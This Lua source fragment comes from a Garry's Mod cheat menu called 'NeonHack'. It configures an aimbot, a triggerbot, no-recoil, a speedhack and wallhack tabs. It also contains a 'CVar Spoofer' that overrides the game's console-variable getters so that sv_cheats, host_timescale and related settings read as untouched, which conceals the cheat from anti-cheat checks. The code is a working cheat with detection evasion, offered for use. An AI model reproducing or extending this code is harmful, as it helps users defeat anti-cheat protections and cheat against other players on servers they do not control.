--SpeedHack Cheats Off
local SHCOCheckBox = vgui.Create( "DCheckBox", T3 )
SHCOCheckBox:SetPos( 12, 125 )
SHCOCheckBox:SetConVar( "Neon_SpeedHack_CheatsOff" )

local SHCOCheckBoxL = vgui.Create( "DLabel", T3 )
SHCOCheckBoxL:SetPos( 30, 125 )
SHCOCheckBoxL:SetText( "After use, SV_CHEATS to 0" )
SHCOCheckBoxL:SetTextColor( Color( 0, 255, 0, 255 ) )
SHCOCheckBoxL:SizeToContents()

----------------------------------------------------------------------

local T4 = vgui.Create( "DLabel", _Pan )
T4:SetPos( 0, 0 )
T4:SetText( "" )

local T4B = vgui.Create( "DImage", T4 )
T4B:SetMaterial( Material( "NeonHack/NeonBG.vtf" ) )
T4B:SetPos( 0, 0 )
T4B:SetSize( 375, 262 )

local NeonInfoLabel

http.Get( "http://dl.dropbox.com/u/5106986/NeonHackInfo.html", "", function( data )
NeonInfoLabel = vgui.Create( "DLabel", T4 )
NeonInfoLabel:SetPos( 10, 5 )
NeonInfoLabel:SetText( data )
NeonInfoLabel:SizeToContents()
NeonInfoLabel:SetTextColor( color_white )
end )

-------------------------------------------------------------------

local T5 = vgui.Create( "DLabel", _Pan )
T5:SetPos( 0, 0 )
T5:SetText( "" )

local T5B = vgui.Create( "DImage", T5 )
T5B:SetMaterial( Material( "NeonHack/NeonBG.vtf" ) )
T5B:SetPos( 0, 0 )
T5B:SetSize( 375, 262 )

local ABSL = vgui.Create( "DLabel", T5 )
ABSL:SetPos( 12, 25 )
ABSL:SetText( "-AimBot Settings-" )
ABSL:SetTextColor( Color( 204, 0, 204, 255 ) )
ABSL:SizeToContents()

--NoRecoil
local NR11CheckBox = vgui.Create( "DCheckBox", T5 )
NR11CheckBox:SetPos( 12, 50 )
NR11CheckBox:SetConVar( "Neon_AimBot_NoRecoil" )

local NR11CheckBoxL = vgui.Create( "DLabel", T5 )
NR11CheckBoxL:SetPos( 30, 50 )
NR11CheckBoxL:SetText( "No Recoil" )
NR11CheckBoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
NR11CheckBoxL:SizeToContents()

--FriendlyFire
local FFCheckBox = vgui.Create( "DCheckBox", T5 )
FFCheckBox:SetPos( 12, 75 )
FFCheckBox:SetConVar( "Neon_AimBot_FriendlyFire" )

local FF22CheckBoxL = vgui.Create( "DLabel", T5 )
FF22CheckBoxL:SetPos( 30, 75 )
FF22CheckBoxL:SetText( "Friendly Fire" )
FF22CheckBoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
FF22CheckBoxL:SizeToContents()

--IgnoreSteamFriends
local ISFCheckBox = vgui.Create( "DCheckBox", T5 )
ISFCheckBox:SetPos( 12, 100 )
ISFCheckBox:SetConVar( "Neon_AimBot_IgnoreSteamFriends" )

local ISF22CheckBoxL = vgui.Create( "DLabel", T5 )
ISF22CheckBoxL:SetPos( 30, 100 )
ISF22CheckBoxL:SetText( "Ignore Steam Friends" )
ISF22CheckBoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
ISF22CheckBoxL:SizeToContents()

--AimBone
local AimBone1 = vgui.Create( "DNumSlider", T5 )
AimBone1:SetText( "Aim Bone" )
AimBone1:SetPos( 192, 25 )
AimBone1:SetMinMax( 1, 4 )
AimBone1:SetWide( 120 )
AimBone1:SetMouseInputEnabled( true )
AimBone1:SetDecimals( 0 )
AimBone1:SetConVar( "Neon_AimBot_AimBone" )

--AimOffset
local AimOffset1 = vgui.Create( "DNumSlider", T5 )
AimOffset1:SetText( "Aim Offset" )
AimOffset1:SetPos( 192, 75 )
AimOffset1:SetMinMax( -100, 100 )
AimOffset1:SetWide( 120 )
AimOffset1:SetMouseInputEnabled( true )
AimOffset1:SetDecimals( 0 )
AimOffset1:SetConVar( "Neon_AimBot_AimOffset" )

--SmoothAim
local AimOffset1 = vgui.Create( "DNumSlider", T5 )
AimOffset1:SetText( "SmoothAim Speed" )
AimOffset1:SetPos( 192, 125 )
AimOffset1:SetMinMax( 1, 15 )
AimOffset1:SetWide( 120 )
AimOffset1:SetMouseInputEnabled( true )
AimOffset1:SetDecimals( 0 )
AimOffset1:SetConVar( "Neon_AimBot_SmoothAimSpeed" )

local MenuButton = vgui.Create( "DButton", T5 )
MenuButton:SetText( "Aim Mode &gt;" )
MenuButton:SetPos( 192, 195 )
MenuButton:SetSize( 120, 25 )
MenuButton.DoClick = function ()
    local MenuButtonOptions = DermaMenu()
    MenuButtonOptions:AddOption( "Crosshair", function() RunConsoleCommand( "Neon_AimBot_AimMode", 2 ) end )
    MenuButtonOptions:AddOption( "Distance", function() RunConsoleCommand( "Neon_AimBot_AimMode", 1 ) end )
    MenuButtonOptions:Open()
end

--IgnoreAdmins
local IACheckBox = vgui.Create( "DCheckBox", T5 )
IACheckBox:SetPos( 12, 125 )
IACheckBox:SetConVar( "Neon_AimBot_IgnoreAdmins" )

local IACheckBoxL = vgui.Create( "DLabel", T5 )
IACheckBoxL:SetPos( 30, 125 )
IACheckBoxL:SetText( "Ignore Admins" )
IACheckBoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
IACheckBoxL:SizeToContents()

--TriggerBot
local TriggerCheckBox = vgui.Create( "DCheckBox", T5 )
TriggerCheckBox:SetPos( 12, 150 )
TriggerCheckBox:SetConVar( "Neon_AimBot_TriggerBot" )

local TriggerCheckBoxL = vgui.Create( "DLabel", T5 )
TriggerCheckBoxL:SetPos( 30, 150 )
TriggerCheckBoxL:SetText( "TriggerBot" )
TriggerCheckBoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
TriggerCheckBoxL:SizeToContents()

--SmoothAim
local Trigger33CheckBox = vgui.Create( "DCheckBox", T5 )
Trigger33CheckBox:SetPos( 12, 175 )
Trigger33CheckBox:SetConVar( "Neon_AimBot_SmoothAimEnabled" )

local Trigger33CheckBoxL = vgui.Create( "DLabel", T5 )
Trigger33CheckBoxL:SetPos( 30, 175 )
Trigger33CheckBoxL:SetText( "SmoothAim" )
Trigger33CheckBoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
Trigger33CheckBoxL:SizeToContents()

--AimStatus
local KeypadCheck2Box = vgui.Create( "DCheckBox", T5 )
KeypadCheck2Box:SetPos( 12, 200 )
KeypadCheck2Box:SetConVar( "Neon_AimBot_ShowAimStatus" )

local KeypadCheck2BoxL = vgui.Create( "DLabel", T5 )
KeypadCheck2BoxL:SetPos( 30, 200 )
KeypadCheck2BoxL:SetText( "Aim Status" )
KeypadCheck2BoxL:SetTextColor( Color( 204, 0, 204, 255 ) )
KeypadCheck2BoxL:SizeToContents()

------------------------------------------------------------------------------------

--Tabs
Panel:AddSheet( "AimBot", T5, "gui/silkicons/bomb", false, false, "Player Aimbot" )
Panel:AddSheet( "HUD", T1, "gui/silkicons/user", false, false, "ESP + WallHack" )
Panel:AddSheet( "Misc", T2, "gui/silkicons/plugin", false, false, "Miscellaneous" )
Panel:AddSheet( "SpeedHack", T3, "gui/silkicons/car", false, false, "SpeedHack" )
Panel:AddSheet( "Info + Help", T4, "gui/silkicons/shield", false, false, "NeonHack Info + Help" )

end

concommand.Add( "+neon_menu", NeonMenu )
concommand.Add( "-neon_menu", function() Panel:Remove() end )

--[[
local NeonCommands = {}
NeonCommands[1] = "+neon_menu"
NeonCommands[2] = "-neon_menu"
NeonCommands[3] = "+neon_speedhack"
NeonCommands[4] = "-neon_speedhack"
NeonCommands[5] = "+neon_propkill"
NeonCommands[6] = "-neon_propkill"
]]--

---------------------------

--CVar Spoofer--
--Go Beyond The Limit...

local oCVGI = _R.ConVar.GetInt
local oCVGB = _R.ConVar.GetBool
local oGCVN = GetConVarNumber
local oGCVS = GetConVarString

function GetConVarNumber( cvar )
        if( cvar == "sv_cheats" ) then return 0 end
        if( cvar == "host_timescale" ) then return 1 end
        if( cvar == "host_framerate" ) then return 0 end
        if( cvar == "sv_allow_voice_from_file" ) then return 0 end
        if( cvar == "r_drawothermodels" ) then return 1 end
        return oGCVN( cvar )
end
 
function GetConVarString( cvar )
        if( cvar == "sv_cheats" ) then return "0" end
        if( cvar == "host_timescale" ) then return "1" end
        if( cvar == "host_framerate" ) then return "0" end
        if( cvar == "sv_allow_voice_from_file" ) then return "0" end
        if( cvar == "r_drawothermodels" ) then return "1" end
        return oGCVS( cvar )
end

function _R.ConVar.GetInt( cvar )
        if( cvar:GetName() == "sv_cheats" ) then return 0 end
        if( cvar:GetName() == "host_timescale" ) then return 1 end
        if( cvar:GetName() == "host_framerate" ) then return 0 end
        if( cvar:GetName() == "sv_allow_voice_from_file" ) then return 0 end
        if( cvar:GetName() == "r_drawothermodels" ) then return 1 end
        return oCVGI( cvar )
end
 
function _R.ConVar.GetBool( cvar )
        if( cvar:GetName() == "sv_cheats" ) then return false end
        if( cvar:GetName() == "host_timescale" ) then return true end
        if( cvar:GetName() == "host_framerate" ) then return false end
        if( cvar:GetName() == "sv_allow_voice_from_file" ) then return false end
        if( cvar:GetName() == "r_drawothermodels" ) then return true end
        return oCVGB( cvar )
	end
end